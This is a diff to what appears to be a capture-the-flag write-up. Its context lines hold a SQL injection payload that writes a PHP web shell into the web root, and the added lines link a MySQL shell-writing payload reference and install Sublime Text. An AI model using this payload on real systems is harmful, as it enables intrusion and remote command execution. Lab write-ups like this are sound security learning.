@@ -132,6 +132,10 @@ tom" union select 1,2,3-- -
 tom" UNION SELECT 1,"<?php echo shell_exec($_GET['cmd']);?>",2 INTO OUTFILE "/var/www/html/shell.php" -- '
 ```
 
+*Extra info
+![image](https://user-images.githubusercontent.com/5285547/126409027-7d78bfa0-1586-4489-b4e3-811ac3dc081f.png)  
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-write-a-shell
+
 Webshell 
 
 http://IP/admin/shell.php
@@ -181,6 +185,15 @@ go through the results.
 python3 -m http.server 8899
 wget http://IP:8899/tcpdump.out
 ```
+
+Using sublimetext I went over the results. 
+
+
+```
+sudo apt-get update 
+sudo apt-get install sublime-text -y
+```
+*Here if you need or like sublime text and don't have it
 
 
 
